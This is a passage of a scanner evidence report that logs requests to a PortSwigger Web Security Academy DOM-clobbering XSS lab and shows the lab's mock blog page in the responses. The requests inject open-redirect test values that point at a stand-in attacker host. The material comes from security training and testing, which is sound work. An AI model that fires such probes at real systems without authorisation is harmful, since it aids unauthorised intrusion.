+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;blog&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;div class=&quot;blog-post&quot;&gt;
+                    &lt;img src=&quot;/image/blog/posts/21.jpg&quot;&gt;
+                    &lt;h1&gt;The Do&amp;apos;s &amp;amp; Don&amp;apos;ts of Writing Your Resume&lt;/h1&gt;
+                    &lt;p&gt;&lt;span id=blog-author&gt;Dean N&amp;apos;Mean&lt;/span&gt; | 10 June 2026&lt;/p&gt;
+                    &lt;hr&gt;
+                    &lt;p&gt;We all know how extremely important first impressions are, especially in the business world. Your resume is your handshake to your future employer, don&amp;apos;t make it a sweaty limp one.&lt;/p&gt;
+                    &lt;p&gt;The first thing to remember is don&amp;apos;t try and be funny in your job descriptions. If you&amp;apos;ve been working with children the employer doesn&amp;apos;t want to read &amp;apos;could have given them a smack most days, but loved them really&amp;apos;. They will think it only a matter of time before you reach breaking point and this could become a reality.&lt;/p&gt;
+                    &lt;p&gt;Swearing is usually frowned upon. Just because you&amp;apos;ve seen all those memes on facebook stating that people who swear have the highest intelligence doesn&amp;apos;t mean it&amp;apos;s true, or that you should use bad language in your profile.&lt;/p&gt;
+                    &lt;p&gt;If you are presenting a hard copy of your resume at interview your future boss doesn&amp;apos;t want to see what you had for breakfast. It is quite possible they have allergies, or could be vegan, and that little bit of bacon fat stuck to your educational history could really put them off you.&lt;/p&gt;
+                    &lt;p&gt;Don&amp;apos;t include anything you can&amp;apos;t live up to. Applying to become a ski instructor when you can&amp;apos;t ski could be problematic, and quite a bit dangerous. Imagine being put to the test at an interview of everything you have listed as a skill, if you can&amp;apos;t do it don&amp;apos;t include it. Picture everyone&amp;apos;s embarrassment when you have stated you can &amp;apos;do it blindfolded&amp;apos; and you knock over the 15th-century porcelain vase containing the interviewer&amp;apos;s mother&amp;apos;s ashes.&lt;/p&gt;
+                    &lt;p&gt;It is not enough to just give your previous job title, it is important to give a short description of your duties. The job description might suggest the company is &amp;apos;laid back&amp;apos;, and they &amp;apos;enjoy the camaraderie of team spirit&amp;apos;, but this does not mean you describe how you were the one who always photocopied your fanny at the Christmas party. Keep it specific to what you were paid for. That does not include adding all the boozy lunches you had with clients on expenses, or how you used company funds to take them on to a lap dancing club. This is NOT what they mean by laid back or camaraderie.&lt;/p&gt;
+                    &lt;p&gt;Ask yourself, would you employ you? If the answer is yes then you probably need to rewrite your resume until it reads like someone you wouldn&amp;apos;t employ.&lt;/p&gt;
+                    &lt;div/&gt;
+                    &lt;hr&gt;
+                    &lt;h1&gt;Comments&lt;/h1&gt;
+                    &lt;span id='user-comments'&gt;
+                    &lt;script src='/resources/js/domPurify-2.0.15.js'&gt;&lt;/script&gt;
+                    &lt;script src='/resources/js/loadCommentsWithDomClobbering.js'&gt;&lt;/script&gt;
+                    &lt;script&gt;loadComments('/post/comment')&lt;/script&gt;
+                    &lt;/span&gt;
+                    &lt;hr&gt;
+                    &lt;section class=&quot;add-comment&quot;&gt;
+                        &lt;h2&gt;Leave a comment&lt;/h2&gt;
+                        &lt;form action=&quot;/post/comment&quot; method=&quot;POST&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt;
+                            &lt;input required type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;CI4QRpHaDkvm7mL5oyJmuJCykvcKyypg&quot;&gt;
+                            &lt;input required type=&quot;hidden&quot; name=&quot;postId&quot; value=&quot;1&quot;&gt;
+                            &lt;label&gt;Comment:&lt;/label&gt;
+                            &lt;div&gt;HTML is allowed&lt;/div&gt;
+                            &lt;textarea required rows=&quot;12&quot; cols=&quot;300&quot; name=&quot;comment&quot;&gt;&lt;/textarea&gt;
+                                    &lt;label&gt;Name:&lt;/label&gt;
+                                    &lt;input required type=&quot;text&quot; name=&quot;name&quot;&gt;
+                                    &lt;label&gt;Email:&lt;/label&gt;
+                                    &lt;input required type=&quot;email&quot; name=&quot;email&quot;&gt;
+                                    &lt;label&gt;Website:&lt;/label&gt;
+                                    &lt;input pattern=&quot;(http:|https:).+&quot; type=&quot;text&quot; name=&quot;website&quot;&gt;
+                            &lt;button class=&quot;button&quot; type=&quot;submit&quot;&gt;Post Comment&lt;/button&gt;
+                        &lt;/form&gt;
+                    &lt;/section&gt;
+                    &lt;div class=&quot;is-linkback&quot;&gt;
+                        &lt;a href=&quot;/&quot;&gt;Back to Blog&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6r7b27-83</code> — <code>artifacts/_/ev-mr6r7b27-83/</code></div><div class="lbl">REQUEST</div><pre>GET /post?postId=1&amp;url=https://evil-attacker.example/ HTTP/1.1
+Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-encoding: gzip
+content-length: 3687
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsBlog.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='UGVyZm9ybSBhbiBYU1MgYXR0YWNrIHRoYXQgY2F1c2VzIEJ1cnAncyBicm93c2VyIChvciBDaHJvbWUpIHRvIGNhbGwgdGhlIDxjb2RlPmFsZXJ0KCk8L2NvZGU+IGZ1bmN0aW9uLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2RvbS1iYXNlZC9kb20tY2xvYmJlcmluZy9sYWItZG9tLXhzcy1leHBsb2l0aW5nLWRvbS1jbG9iYmVyaW5n'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;blog&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;div class=&quot;blog-post&quot;&gt;
+                    &lt;img src=&quot;/image/blog/posts/21.jpg&quot;&gt;
+                    &lt;h1&gt;The Do&amp;apos;s &amp;amp; Don&amp;apos;ts of Writing Your Resume&lt;/h1&gt;
+                    &lt;p&gt;&lt;span id=blog-author&gt;Dean N&amp;apos;Mean&lt;/span&gt; | 10 June 2026&lt;/p&gt;
+                    &lt;hr&gt;
+                    &lt;p&gt;We all know how extremely important first impressions are, especially in the business world. Your resume is your handshake to your future employer, don&amp;apos;t make it a sweaty limp one.&lt;/p&gt;
+                    &lt;p&gt;The first thing to remember is don&amp;apos;t try and be funny in your job descriptions. If you&amp;apos;ve been working with children the employer doesn&amp;apos;t want to read &amp;apos;could have given them a smack most days, but loved them really&amp;apos;. They will think it only a matter of time before you reach breaking point and this could become a reality.&lt;/p&gt;
+                    &lt;p&gt;Swearing is usually frowned upon. Just because you&amp;apos;ve seen all those memes on facebook stating that people who swear have the highest intelligence doesn&amp;apos;t mean it&amp;apos;s true, or that you should use bad language in your profile.&lt;/p&gt;
+                    &lt;p&gt;If you are presenting a hard copy of your resume at interview your future boss doesn&amp;apos;t want to see what you had for breakfast. It is quite possible they have allergies, or could be vegan, and that little bit of bacon fat stuck to your educational history could really put them off you.&lt;/p&gt;
+                    &lt;p&gt;Don&amp;apos;t include anything you can&amp;apos;t live up to. Applying to become a ski instructor when you can&amp;apos;t ski could be problematic, and quite a bit dangerous. Imagine being put to the test at an interview of everything you have listed as a skill, if you can&amp;apos;t do it don&amp;apos;t include it. Picture everyone&amp;apos;s embarrassment when you have stated you can &amp;apos;do it blindfolded&amp;apos; and you knock over the 15th-century porcelain vase containing the interviewer&amp;apos;s mother&amp;apos;s ashes.&lt;/p&gt;
+                    &lt;p&gt;It is not enough to just give your previous job title, it is important to give a short description of your duties. The job description might suggest the company is &amp;apos;laid back&amp;apos;, and they &amp;apos;enjoy the camaraderie of team spirit&amp;apos;, but this does not mean you describe how you were the one who always photocopied your fanny at the Christmas party. Keep it specific to what you were paid for. That does not include adding all the boozy lunches you had with clients on expenses, or how you used company funds to take them on to a lap dancing club. This is NOT what they mean by laid back or camaraderie.&lt;/p&gt;
+                    &lt;p&gt;Ask yourself, would you employ you? If the answer is yes then you probably need to rewrite your resume until it reads like someone you wouldn&amp;apos;t employ.&lt;/p&gt;
+                    &lt;div/&gt;
+                    &lt;hr&gt;
+                    &lt;h1&gt;Comments&lt;/h1&gt;
+                    &lt;span id='user-comments'&gt;
+                    &lt;script src='/resources/js/domPurify-2.0.15.js'&gt;&lt;/script&gt;
+                    &lt;script src='/resources/js/loadCommentsWithDomClobbering.js'&gt;&lt;/script&gt;
+                    &lt;script&gt;loadComments('/post/comment')&lt;/script&gt;
+                    &lt;/span&gt;
+                    &lt;hr&gt;
+                    &lt;section class=&quot;add-comment&quot;&gt;
+                        &lt;h2&gt;Leave a comment&lt;/h2&gt;
+                        &lt;form action=&quot;/post/comment&quot; method=&quot;POST&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt;
+                            &lt;input required type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;oUttzU7I69Y7kohlPeyMa6wz5vMeGztc&quot;&gt;
+                            &lt;input required type=&quot;hidden&quot; name=&quot;postId&quot; value=&quot;1&quot;&gt;
+                            &lt;label&gt;Comment:&lt;/label&gt;
+                            &lt;div&gt;HTML is allowed&lt;/div&gt;
+                            &lt;textarea required rows=&quot;12&quot; cols=&quot;300&quot; name=&quot;comment&quot;&gt;&lt;/textarea&gt;
+                                    &lt;label&gt;Name:&lt;/label&gt;
+                                    &lt;input required type=&quot;text&quot; name=&quot;name&quot;&gt;
+                                    &lt;label&gt;Email:&lt;/label&gt;
+                                    &lt;input required type=&quot;email&quot; name=&quot;email&quot;&gt;
+                                    &lt;label&gt;Website:&lt;/label&gt;
+                                    &lt;input pattern=&quot;(http:|https:).+&quot; type=&quot;text&quot; name=&quot;website&quot;&gt;
+                            &lt;button class=&quot;button&quot; type=&quot;submit&quot;&gt;Post Comment&lt;/button&gt;
+                        &lt;/form&gt;
+                    &lt;/section&gt;
+                    &lt;div class=&quot;is-linkback&quot;&gt;
+                        &lt;a href=&quot;/&quot;&gt;Back to Blog&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;div class=&quot;footer-wrapper&quot;&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr6r7ekd-84</code> — <code>artifacts/_/ev-mr6r7ekd-84/</code></div><div class="lbl">REQUEST</div><pre>GET /post?postId=1&amp;redirect=https://evil-attacker.example/ HTTP/1.1
+Host: 0abb00c50377a549817352fe00530037.web-security-academy.net
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-encoding: gzip
+content-length: 3687
+content-type: text/html; charset=utf-8
+set-cookie: &lt;redacted&gt;
+x-frame-options: SAMEORIGIN
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--LAB_HEAD_START--&gt;
+    &lt;head&gt;
+        &lt;link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet&gt;
+        &lt;link href=/resources/css/labsBlog.css rel=stylesheet&gt;
+        &lt;title&gt;Mystery challenge&lt;/title&gt;
+    &lt;/head&gt;
+&lt;!--LAB_HEAD_END--&gt;
+    &lt;body&gt;
+        &lt;script src=&quot;/resources/labheader/js/labHeader.js&quot;&gt;&lt;/script&gt;
+        &lt;!--LAB_HEADER_START--&gt;
+        &lt;div id=&quot;academyLabHeader&quot;&gt;
+            &lt;section class='academyLabBanner is-solved'&gt;
+                &lt;div class=container&gt;
+                    &lt;div class=logo&gt;&lt;/div&gt;
+                        &lt;div class=title-container&gt;
+                            &lt;h2&gt;Mystery challenge&lt;/h2&gt;
+                            &lt;a class=link-back href='https://portswigger.net/web-security/dashboard'&gt;
+                                Back&amp;nbsp;to&amp;nbsp;lab&amp;nbsp;dashboard&amp;nbsp;
+                                &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                    &lt;g&gt;
+                                        &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                        &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                    &lt;/g&gt;
+                                &lt;/svg&gt;
+                            &lt;/a&gt;
+                            &lt;br/&gt;&lt;div id=mysteryObjective&gt;&lt;a id=mysteryReveal data-hidden-objective='UGVyZm9ybSBhbiBYU1MgYXR0YWNrIHRoYXQgY2F1c2VzIEJ1cnAncyBicm93c2VyIChvciBDaHJvbWUpIHRvIGNhbGwgdGhlIDxjb2RlPmFsZXJ0KCk8L2NvZGU+IGZ1bmN0aW9uLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2RvbS1iYXNlZC9kb20tY2xvYmJlcmluZy9sYWItZG9tLXhzcy1leHBsb2l0aW5nLWRvbS1jbG9iYmVyaW5n'&gt;
+                                Reveal&amp;nbsp;objective&amp;nbsp;
+                            &lt;/a&gt;&lt;/div&gt;
+                            &lt;script src='/resources/labheader/js/mysteryObjective.js'&gt;&lt;/script&gt;
+                        &lt;/div&gt;
+                        &lt;div class='widgetcontainer-lab-status is-solved'&gt;
+                            &lt;span&gt;LAB&lt;/span&gt;
+                            &lt;p&gt;Solved&lt;/p&gt;
+                            &lt;span class=lab-status-icon&gt;&lt;/span&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+            &lt;section id=notification-labsolved class=notification-labsolved&gt;
+                &lt;div class=container&gt;
+                    &lt;h4&gt;Congratulations, you solved the lab!&lt;/h4&gt;
+                    &lt;div&gt;
+                        &lt;span&gt;
+                            Share your skills!
+                        &lt;/span&gt;
+                        &lt;a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&amp;url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering&amp;related=WebSecAcademy,Burp_Suite'&gt;
+                    &lt;svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'&gt;
+                        &lt;title&gt;twitter-button&lt;/title&gt;
+                        &lt;path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'&gt;&lt;/path&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-xss-exploiting-dom-clobbering'&gt;
+                    &lt;svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
+                        &lt;title&gt;linkedin-button&lt;/title&gt;
+                        &lt;path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/&gt;
+                    &lt;/svg&gt;
+                        &lt;/a&gt;
+                        &lt;a href='https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering'&gt;
+                            Continue learning 
+                            &lt;svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow&gt;
+                                &lt;g&gt;
+                                    &lt;polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'&gt;&lt;/polygon&gt;
+                                    &lt;polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'&gt;&lt;/polygon&gt;
+                                &lt;/g&gt;
+                            &lt;/svg&gt;
+                        &lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/section&gt;
+        &lt;/div&gt;
+        &lt;!--LAB_HEADER_END--&gt;
+        &lt;div theme=&quot;blog&quot;&gt;
+            &lt;section class=&quot;maincontainer&quot;&gt;
+                &lt;div class=&quot;container is-page&quot;&gt;
+                    &lt;header class=&quot;navigation-header&quot;&gt;
+                        &lt;section class=&quot;top-links&quot;&gt;
+                            &lt;a href=/&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
+                        &lt;/section&gt;
+                    &lt;/header&gt;
+                    &lt;header class=&quot;notification-header&quot;&gt;
+                    &lt;/header&gt;
+                    &lt;div class=&quot;blog-post&quot;&gt;
+                    &lt;img src=&quot;/image/blog/posts/21.jpg&quot;&gt;
+                    &lt;h1&gt;The Do&amp;apos;s &amp;amp; Don&amp;apos;ts of Writing Your Resume&lt;/h1&gt;
+                    &lt;p&gt;&lt;span id=blog-author&gt;Dean N&amp;apos;Mean&lt;/span&gt; | 10 June 2026&lt;/p&gt;
+                    &lt;hr&gt;
+                    &lt;p&gt;We all know how extremely important first impressions are, especially in the business world. Your resume is your handshake to your future employer, don&amp;apos;t make it a sweaty limp one.&lt;/p&gt;
+                    &lt;p&gt;The first thing to remember is don&amp;apos;t try and be funny in your job descriptions. If you&amp;apos;ve been working with children the employer doesn&amp;apos;t want to read &amp;apos;could have given them a smack most days, but loved them really&amp;apos;. They will think it only a matter of time before you reach breaking point and this could become a reality.&lt;/p&gt;
+                    &lt;p&gt;Swearing is usually frowned upon. Just because you&amp;apos;ve seen all those memes on facebook stating that people who swear have the highest intelligence doesn&amp;apos;t mean it&amp;apos;s true, or that you should use bad language in your profile.&lt;/p&gt;
+                    &lt;p&gt;If you are presenting a hard copy of your resume at interview your future boss doesn&amp;apos;t want to see what you had for breakfast. It is quite possible they have allergies, or could be vegan, and that little bit of bacon fat stuck to your educational history could really put them off you.&lt;/p&gt;
+                    &lt;p&gt;Don&amp;apos;t include anything you can&amp;apos;t live up to. Applying to become a ski instructor when you can&amp;apos;t ski could be problematic, and quite a bit dangerous. Imagine being put to the test at an interview of everything you have listed as a skill, if you can&amp;apos;t do it don&amp;apos;t include it. Picture everyone&amp;apos;s embarrassment when you have stated you can &amp;apos;do it blindfolded&amp;apos; and you knock over the 15th-century porcelain vase containing the interviewer&amp;apos;s mother&amp;apos;s ashes.&lt;/p&gt;
+                    &lt;p&gt;It is not enough to just give your previous job title, it is important to give a short description of your duties. The job description might suggest the company is &amp;apos;laid back&amp;apos;, and they &amp;apos;enjoy the camaraderie of team spirit&amp;apos;, but this does not mean you describe how you were the one who always photocopied your fanny at the Christmas party. Keep it specific to what you were paid for. That does not include adding all the boozy lunches you had with clients on expenses, or how you used company funds to take them on to a lap dancing club. This is NOT what they mean by laid back or camaraderie.&lt;/p&gt;
+                    &lt;p&gt;Ask yourself, would you employ you? If the answer is yes then you probably need to rewrite your resume until it reads like someone you wouldn&amp;apos;t employ.&lt;/p&gt;
+                    &lt;div/&gt;
+                    &lt;hr&gt;
+                    &lt;h1&gt;Comments&lt;/h1&gt;
